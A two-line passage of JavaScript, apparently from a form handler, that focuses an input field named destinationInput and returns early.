             destinationInput.focus();
             return;
